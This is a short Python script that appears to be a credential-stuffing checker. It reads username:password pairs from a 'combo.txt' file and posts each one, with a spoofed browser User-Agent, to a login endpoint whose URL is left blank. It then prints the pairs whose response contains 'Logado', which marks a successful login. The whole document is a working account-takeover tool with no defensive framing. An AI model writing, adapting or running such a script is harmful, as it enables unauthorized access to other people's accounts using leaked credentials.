from cgitb import text
from gettext import find
import requests

req = requests.session()
stop = "default"
a = open("combo.txt", "r")
file = [s.rstrip()for s in a.readlines()]
for lines in file:
    combo = lines.split(":")
    param={
        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
        "Connection": "keep-alive",
        "Host": "",
        "Origin": "",
        "Referer": "",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.134 Safari/537.36 OPR/89.0.4447.98 (Edition std-1)",
        "X-Requested-With": "XMLHttpRequest",
        "username": combo[0],
        "password": combo[1],
    }
    source = req.post("", data=param)
    print(source.text)
    if "Logado" in source.text:
        print(f"{lines}")
